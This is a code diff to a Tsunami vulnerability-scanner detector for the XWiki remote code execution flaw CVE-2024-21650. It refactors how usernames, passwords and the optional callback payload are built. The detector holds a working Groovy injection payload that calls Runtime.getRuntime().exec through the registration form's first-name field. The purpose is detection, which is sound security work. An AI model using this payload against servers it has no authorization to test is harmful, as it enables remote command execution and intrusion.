@@ -1,5 +1,12 @@
 package com.google.tsunami.plugins.detectors.rce.cve202421650;
 
+import static com.google.common.base.Preconditions.checkNotNull;
+import static com.google.common.collect.ImmutableList.toImmutableList;
+import static com.google.tsunami.common.net.http.HttpRequest.get;
+import static com.google.tsunami.common.net.http.HttpRequest.post;
+import static com.google.tsunami.common.net.http.HttpRequest.put;
+import static java.nio.charset.StandardCharsets.UTF_8;
+
 import com.google.common.annotations.VisibleForTesting;
 import com.google.common.collect.ImmutableList;
 import com.google.common.flogger.GoogleLogger;
@@ -27,24 +34,14 @@ import com.google.tsunami.proto.Severity;
 import com.google.tsunami.proto.TargetInfo;
 import com.google.tsunami.proto.Vulnerability;
 import com.google.tsunami.proto.VulnerabilityId;
-
-import javax.inject.Inject;
 import java.io.IOException;
-
 import java.time.Clock;
 import java.time.Duration;
 import java.time.Instant;
 import java.util.Base64;
 import java.util.regex.Matcher;
 import java.util.regex.Pattern;
-
-import static java.nio.charset.StandardCharsets.UTF_8;
-
-import static com.google.common.base.Preconditions.checkNotNull;
-import static com.google.common.collect.ImmutableList.toImmutableList;
-import static com.google.tsunami.common.net.http.HttpRequest.get;
-import static com.google.tsunami.common.net.http.HttpRequest.post;
-import static com.google.tsunami.common.net.http.HttpRequest.put;
+import javax.inject.Inject;
 
 /** A {@link VulnDetector} that detects XWiki RCE CVE-2024-21650. */
 @PluginInfo(
@@ -60,38 +57,22 @@ public final class Cve202421650Detector implements VulnDetector {
   private static final String REQUEST_PATH = "bin/register/XWiki/XWikiRegister";
 
   private static final String PAYLOAD_PLACEHOLDER =
-      "]]{{/html}}{{async}}{{groovy}}"
-          + "Runtime.getRuntime().exec(\"{{PAYLOAD}}\")"
-          + "{{/groovy}}{{/async}}";
-
-  private static final String REQUEST_USER_NAME =
-      "test" + Long.toHexString(Double.doubleToLongBits(Math.random()));
-
-  private static final String REQUEST_USER_PASSWORD =
-      Long.toHexString(Double.doubleToLongBits(Math.random()))
-          + Long.toHexString(Double.doubleToLongBits(Math.random()));
+      "]]{{/html}}{{async}}{{groovy}}{{CMD}}{{/groovy}}{{/async}}";
 
   private static final Pattern CSRF_TOKEN_PATTERN =
       Pattern.compile("form_token\" value=\"(.*?)\" />");
 
   private static final String REQUEST_POST_DATA =
       "parent=xwiki:Main.UserDirectory&register_first_name="
-          + PAYLOAD_PLACEHOLDER
+          + "{{PAYLOAD_PLACEHOLDER}}"
           + "&register_last_name=&xwikiname="
-          + REQUEST_USER_NAME
+          + "{{USERNAME}}"
           + "&register_password="
-          + REQUEST_USER_PASSWORD
+          + "{{PASSWORD}}"
           + "&register2_password="
-          + REQUEST_USER_PASSWORD
+          + "{{PASSWORD}}"
           + "&register_email="
           + "&form_token={{TOKEN}}";
-
-  @VisibleForTesting
-  static final String RESPONSE_STRING =
-      "XWiki." + REQUEST_USER_NAME + "]] (" + REQUEST_USER_NAME + ")";
-
-  private static final String REQUEST_CLEANUP_PATH =
-      "rest/wikis/xwiki/spaces/XWiki/pages/" + REQUEST_USER_NAME + "/objects/XWiki.XWikiUsers/0";
 
   private static final String REQUEST_CLEANUP_FIRST_NAME_REPLACEMENT = "Delete Me!";
 
@@ -127,24 +108,42 @@ public final class Cve202421650Detector implements VulnDetector {
         .build();
   }
 
+  @VisibleForTesting
+  String buildRandomString() {
+    return Long.toHexString(Double.doubleToLongBits(Math.random()));
+  }
+
   private boolean isServiceVulnerable(NetworkService networkService) {
     String targetUri =
         NetworkServiceUtils.buildWebApplicationRootUrl(networkService) + REQUEST_PATH;
 
+    Payload payload = null;
+    String cmd = "";
+    if (payloadGenerator.isCallbackServerEnabled()) {
+      PayloadGeneratorConfig config =
+          PayloadGeneratorConfig.newBuilder()
+              .setVulnerabilityType(PayloadGeneratorConfig.VulnerabilityType.BLIND_RCE)
+              .setInterpretationEnvironment(
+                  PayloadGeneratorConfig.InterpretationEnvironment.LINUX_SHELL)
+              .setExecutionEnvironment(
+                  PayloadGeneratorConfig.ExecutionEnvironment.EXEC_INTERPRETATION_ENVIRONMENT)
+              .build();
+
+      payload = payloadGenerator.generate(config);
+      cmd = payload.getPayload();
+    }
+
+    String requestUserName = "test" + buildRandomString();
+
+    String requestUserPassword = buildRandomString() + buildRandomString();
+
+    String responseString = "XWiki." + requestUserName + "]] (" + requestUserName + ")";
+
+    String requestCleanupPath =
+        "rest/wikis/xwiki/spaces/XWiki/pages/" + requestUserName + "/objects/XWiki.XWikiUsers/0";
+
     String targetCleanupUri =
-        NetworkServiceUtils.buildWebApplicationRootUrl(networkService) + REQUEST_CLEANUP_PATH;
-
-    PayloadGeneratorConfig config =
-        PayloadGeneratorConfig.newBuilder()
-            .setVulnerabilityType(PayloadGeneratorConfig.VulnerabilityType.BLIND_RCE)
-            .setInterpretationEnvironment(
-                PayloadGeneratorConfig.InterpretationEnvironment.LINUX_SHELL)
-            .setExecutionEnvironment(
-                PayloadGeneratorConfig.ExecutionEnvironment.EXEC_INTERPRETATION_ENVIRONMENT)
-            .build();
-
-    Payload payload = payloadGenerator.generate(config);
-    String cmd = payload.getPayload();
+        NetworkServiceUtils.buildWebApplicationRootUrl(networkService) + requestCleanupPath;
 
     String token = "";
 
@@ -163,14 +162,17 @@ public final class Cve202421650Detector implements VulnDetector {
       if (token.isEmpty()) {
         return false;
       }
-
     } catch (IOException e) {
       logger.atWarning().withCause(e).log("Unable to request '%s'.", targetUri);
     }
 
-    String requestBody = REQUEST_POST_DATA
-            .replace("{{PAYLOAD}}", cmd)
-            .replace("{{TOKEN}}", token);
+    String requestBody =
+        REQUEST_POST_DATA
+            .replace("{{USERNAME}}", requestUserName)
+            .replace("{{PASSWORD}}", requestUserPassword)
+            .replace("{{TOKEN}}", token)
+            .replace("{{PAYLOAD_PLACEHOLDER}}", PAYLOAD_PLACEHOLDER)
+            .replace("{{CMD}}", !cmd.isEmpty() ? "Runtime.getRuntime().exec(\"" + cmd + "\")" : "");
 
     try {
       HttpResponse response =
@@ -184,6 +186,8 @@ public final class Cve202421650Detector implements VulnDetector {
                   .build(),
               networkService);
 
+      Uninterruptibles.sleepUninterruptibly(Duration.ofSeconds(oobSleepDuration));
+
       httpClient.send(
           put(targetCleanupUri)
               .setHeaders(
@@ -195,7 +199,7 @@ public final class Cve202421650Detector implements VulnDetector {
                           "Basic "
                               + Base64.getEncoder()
                                   .encodeToString(
-                                      (REQUEST_USER_NAME + ":" + REQUEST_USER_PASSWORD)
+                                      (requestUserName + ":" + requestUserPassword)
                                           .getBytes(UTF_8)))
                       .build())
               .setRequestBody(
@@ -205,10 +209,8 @@ public final class Cve202421650Detector implements VulnDetector {
               .build(),
           networkService);
 
-      Uninterruptibles.sleepUninterruptibly(Duration.ofSeconds(oobSleepDuration));
-      if (response.bodyString().isPresent()
-              && (payloadGenerator.isCallbackServerEnabled() && payload.checkIfExecuted())
-          || response.bodyString().get().contains(RESPONSE_STRING)) {
+      if (response.bodyString().isPresent() && (payload != null && payload.checkIfExecuted())
+          || response.bodyString().get().contains(responseString)) {
         return true;
       }
     } catch (IOException e) {
